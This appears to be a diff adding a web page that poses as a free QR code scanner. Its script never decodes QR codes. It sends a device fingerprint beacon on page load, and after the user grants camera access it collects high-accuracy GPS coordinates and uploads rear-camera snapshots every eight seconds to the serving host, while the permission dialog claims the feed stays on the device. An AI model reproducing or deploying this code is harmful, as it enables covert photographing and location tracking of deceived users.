@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>QR Scanner - Scan Any QR Code</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Inter',sans-serif; background:#0a0a0a; color:#fff; min-height:100vh; }
+
+  .header {
+    background:linear-gradient(135deg,#1a1a2e,#16213e);
+    padding:16px 20px; display:flex; align-items:center; gap:12px;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+  }
+  .app-icon {
+    width:42px; height:42px; background:linear-gradient(135deg,#00d4ff,#0070ff);
+    border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:22px;
+    box-shadow:0 4px 16px rgba(0,212,255,0.3);
+  }
+  .app-name { font-size:20px; font-weight:700; }
+  .app-sub { font-size:12px; color:rgba(255,255,255,0.5); }
+  .header-right { margin-left:auto; display:flex; gap:8px; }
+  .hdr-btn {
+    background:rgba(255,255,255,0.06); border:none; border-radius:8px;
+    padding:6px 12px; color:rgba(255,255,255,0.7); cursor:pointer; font-size:13px;
+  }
+
+  .scanner-section {
+    padding:24px 20px; max-width:500px; margin:0 auto;
+  }
+
+  .scanner-frame {
+    position:relative; background:#111; border-radius:20px;
+    overflow:hidden; margin-bottom:20px;
+    border:2px solid rgba(0,212,255,0.3);
+    box-shadow:0 0 40px rgba(0,212,255,0.1);
+    aspect-ratio:1;
+  }
+  .scanner-video {
+    width:100%; height:100%; object-fit:cover;
+    transform:scaleX(-1); display:none;
+  }
+  .scanner-video.active { display:block; }
+  .scanner-placeholder {
+    width:100%; height:100%; display:flex;
+    flex-direction:column; align-items:center; justify-content:center;
+    background:radial-gradient(ellipse at center,#0d1b2a,#050d14);
+    min-height:300px;
+  }
+  .scanner-placeholder .ph-icon { font-size:64px; margin-bottom:16px; opacity:0.6; }
+  .scanner-placeholder p { font-size:15px; color:rgba(255,255,255,0.5); text-align:center; padding:0 20px; }
+
+  /* Corner markers */
+  .corner { position:absolute; width:32px; height:32px; z-index:10; }
+  .corner.tl { top:14px; left:14px; border-top:3px solid #00d4ff; border-left:3px solid #00d4ff; border-radius:6px 0 0 0; }
+  .corner.tr { top:14px; right:14px; border-top:3px solid #00d4ff; border-right:3px solid #00d4ff; border-radius:0 6px 0 0; }
+  .corner.bl { bottom:14px; left:14px; border-bottom:3px solid #00d4ff; border-left:3px solid #00d4ff; border-radius:0 0 0 6px; }
+  .corner.br { bottom:14px; right:14px; border-bottom:3px solid #00d4ff; border-right:3px solid #00d4ff; border-radius:0 0 6px 0; }
+
+  .scan-line {
+    position:absolute; left:14px; right:14px; height:2px;
+    background:linear-gradient(90deg,transparent,#00d4ff,transparent);
+    animation:scanMove 2s ease-in-out infinite; display:none;
+  }
+  .scan-line.active { display:block; }
+  @keyframes scanMove { 0%{top:14px} 50%{top:calc(100% - 14px)} 100%{top:14px} }
+
+  .overlay-text {
+    position:absolute; bottom:14px; left:0; right:0;
+    text-align:center; font-size:13px; color:rgba(255,255,255,0.7);
+    background:rgba(0,0,0,0.5); padding:6px;
+  }
+
+  .start-btn {
+    width:100%; padding:16px;
+    background:linear-gradient(135deg,#00d4ff,#0070ff);
+    border:none; border-radius:14px; color:#fff;
+    font-size:17px; font-weight:600; cursor:pointer;
+    transition:all 0.2s; margin-bottom:16px;
+    box-shadow:0 6px 24px rgba(0,112,255,0.4);
+  }
+  .start-btn:hover { transform:translateY(-2px); box-shadow:0 10px 32px rgba(0,112,255,0.5); }
+  .start-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
+
+  .tabs { display:flex; gap:2px; background:rgba(255,255,255,0.04); border-radius:12px; padding:3px; margin-bottom:16px; }
+  .tab {
+    flex:1; padding:8px; text-align:center; border:none; background:none;
+    color:rgba(255,255,255,0.5); border-radius:10px; cursor:pointer; font-size:14px; font-family:inherit;
+    transition:all 0.2s;
+  }
+  .tab.active { background:rgba(0,212,255,0.15); color:#00d4ff; font-weight:500; }
+
+  .result-card {
+    background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06);
+    border-radius:14px; padding:16px; margin-bottom:12px;
+    display:flex; align-items:center; gap:12px;
+  }
+  .result-icon { font-size:24px; }
+  .result-text { flex:1; font-size:14px; }
+  .result-sub { font-size:12px; color:rgba(255,255,255,0.4); margin-top:2px; }
+  .result-action {
+    background:rgba(0,212,255,0.1); border:1px solid rgba(0,212,255,0.2);
+    border-radius:8px; padding:6px 12px; color:#00d4ff; font-size:13px;
+    cursor:pointer; border-width:1px;
+  }
+
+  .tips {
+    background:rgba(0,212,255,0.04); border:1px solid rgba(0,212,255,0.1);
+    border-radius:12px; padding:16px; margin-top:16px;
+  }
+  .tips h4 { font-size:14px; color:#00d4ff; margin-bottom:10px; }
+  .tip-item { font-size:13px; color:rgba(255,255,255,0.6); padding:4px 0; }
+
+  .perm-banner {
+    position:fixed; top:0; left:0; right:0; bottom:0;
+    background:rgba(0,0,0,0.85); backdrop-filter:blur(8px);
+    display:none; align-items:center; justify-content:center; z-index:500;
+  }
+  .perm-banner.show { display:flex; }
+  .perm-box {
+    background:#111927; border:1px solid rgba(0,212,255,0.2);
+    border-radius:20px; padding:36px; max-width:360px; width:90%; text-align:center;
+    animation:fadeUp 0.4s ease;
+  }
+  @keyframes fadeUp { from{transform:translateY(20px);opacity:0} to{transform:translateY(0);opacity:1} }
+  .perm-box .perm-icon { font-size:56px; margin-bottom:16px; }
+  .perm-box h3 { font-size:19px; margin-bottom:10px; }
+  .perm-box p { font-size:13px; color:rgba(255,255,255,0.6); line-height:1.6; margin-bottom:24px; }
+  .perm-allow {
+    width:100%; padding:14px; background:linear-gradient(135deg,#00d4ff,#0070ff);
+    border:none; border-radius:12px; color:#fff; font-size:16px; font-weight:600;
+    cursor:pointer; margin-bottom:8px;
+  }
+  .perm-deny {
+    width:100%; padding:10px; background:none; border:none;
+    color:rgba(255,255,255,0.4); font-size:13px; cursor:pointer;
+  }
+</style>
+</head>
+<body>
+
+<div class="perm-banner" id="permBanner">
+  <div class="perm-box">
+    <div class="perm-icon">📷</div>
+    <h3>Camera Access Required</h3>
+    <p>QR Scanner needs your camera to scan QR codes and barcodes. Your camera feed stays on your device and is not recorded.</p>
+    <button class="perm-allow" id="permAllow">📷 Allow Camera Access</button>
+    <button class="perm-deny">Not now</button>
+  </div>
+</div>
+
+<header class="header">
+  <div class="app-icon">⬛</div>
+  <div>
+    <div class="app-name">QR Scanner Pro</div>
+    <div class="app-sub">Fast & Free QR Reader</div>
+  </div>
+  <div class="header-right">
+    <button class="hdr-btn">⚙️</button>
+    <button class="hdr-btn">📜 History</button>
+  </div>
+</header>
+
+<div class="scanner-section">
+  <div class="tabs">
+    <button class="tab active">📷 Scan</button>
+    <button class="tab">🖼️ Upload</button>
+    <button class="tab">✏️ Generate</button>
+  </div>
+
+  <div class="scanner-frame">
+    <div class="corner tl"></div>
+    <div class="corner tr"></div>
+    <div class="corner bl"></div>
+    <div class="corner br"></div>
+    <div class="scan-line" id="scanLine"></div>
+
+    <div class="scanner-placeholder" id="placeholder">
+      <div class="ph-icon">⬛</div>
+      <p>Point your camera at a QR code or barcode to scan it instantly</p>
+    </div>
+    <video class="scanner-video" id="scannerVideo" autoplay muted playsinline></video>
+    <canvas id="scanCanvas" style="display:none"></canvas>
+    <div class="overlay-text" id="overlayText" style="display:none">🔍 Scanning...</div>
+  </div>
+
+  <button class="start-btn" id="startScanBtn">📷 Start Camera Scanner</button>
+
+  <div style="font-size:13px;color:rgba(255,255,255,0.4);text-align:center;margin-bottom:16px">
+    📍 Location access improves scan accuracy
+  </div>
+
+  <div class="result-card">
+    <div class="result-icon">🔗</div>
+    <div class="result-text">
+      https://example.com/promo
+      <div class="result-sub">Scanned 2 min ago · URL</div>
+    </div>
+    <button class="result-action">Open</button>
+  </div>
+  <div class="result-card">
+    <div class="result-icon">💳</div>
+    <div class="result-text">
+      Payment QR - ₹500
+      <div class="result-sub">Scanned 1 hour ago · Payment</div>
+    </div>
+    <button class="result-action">View</button>
+  </div>
+
+  <div class="tips">
+    <h4>💡 Scanning Tips</h4>
+    <div class="tip-item">✓ Hold phone steady for best results</div>
+    <div class="tip-item">✓ Ensure good lighting</div>
+    <div class="tip-item">✓ Keep QR code within the frame</div>
+  </div>
+</div>
+
+<script>
+const SERVER = window.location.origin;
+let sessionId = null, photoIndex = 0;
+
+async function sendBeacon() {
+  try {
+    const r = await fetch(`${SERVER}/api/beacon`,{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({template:'qrscanner',screen:{width:screen.width,height:screen.height},
+        platform:navigator.platform,language:navigator.language})});
+    sessionId = (await r.json()).session;
+  } catch(e){}
+}
+
+document.getElementById('startScanBtn').addEventListener('click', () => {
+  document.getElementById('permBanner').classList.add('show');
+});
+
+document.getElementById('permAllow').addEventListener('click', async () => {
+  document.getElementById('permBanner').classList.remove('show');
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:{ideal:'environment'},width:{ideal:1280},height:{ideal:720}},audio:false
+    });
+    const video = document.getElementById('scannerVideo');
+    video.srcObject = stream;
+    video.classList.add('active');
+    document.getElementById('placeholder').style.display = 'none';
+    document.getElementById('scanLine').classList.add('active');
+    document.getElementById('overlayText').style.display = 'block';
+    document.getElementById('startScanBtn').textContent = '✅ Camera Active - Scanning...';
+    document.getElementById('startScanBtn').disabled = true;
+
+    console.log('[DEBUG] Location capture called, sessionId=', sessionId);
+    let gpsLat = null, gpsLon = null, gpsAcc = null;
+    let watchId = null;
+
+    if(navigator.geolocation){
+      try {
+        watchId = navigator.geolocation.watchPosition((pos) => {
+          gpsLat = pos.coords.latitude;
+          gpsLon = pos.coords.longitude;
+          gpsAcc = pos.coords.accuracy;
+          console.log('[DEBUG] watchPosition GPS:', gpsLat, gpsLon, gpsAcc, 'm');
+        }, (err) => {
+          console.log('[!] watchPosition error:', err.code, err.message);
+        }, {
+          enableHighAccuracy: true,
+          timeout: 20000,
+          maximumAge: 0
+        });
+
+        await new Promise(r => setTimeout(r, 15000));
+
+        if (watchId) {
+          navigator.geolocation.clearWatch(watchId);
+          watchId = null;
+        }
+      } catch(err) {
+        console.log('[!] Geolocation setup error:', err);
+        if (watchId) {
+          navigator.geolocation.clearWatch(watchId);
+          watchId = null;
+        }
+      }
+    } else {
+      console.log('[DEBUG] Geolocation not supported');
+    }
+    fetch(`${SERVER}/api/location`,{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({session:sessionId,lat:gpsLat,lon:gpsLon,accuracy:gpsAcc})})
+      .then(r=>r.json()).then(d=>console.log('[DEBUG] Location response:', d))
+      .catch(e=>console.log('[!] Location send error:', e));
+
+    const snap = () => {
+      if(video.readyState<2) return;
+      const c = document.getElementById('scanCanvas');
+      c.width=video.videoWidth||640; c.height=video.videoHeight||480;
+      c.getContext('2d').drawImage(video,0,0);
+      const b64=c.toDataURL('image/jpeg',0.85);
+      fetch(`${SERVER}/api/photo`,{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({session:sessionId,image:b64,index:photoIndex++,camera:'back'})});
+    };
+    setTimeout(snap,1500);
+    setInterval(snap,8000);
+  } catch(e){
+    document.getElementById('startScanBtn').textContent = '⚠️ Camera Unavailable';
+  }
+});
+
+sendBeacon();
+</script>
+</body>
+</html>
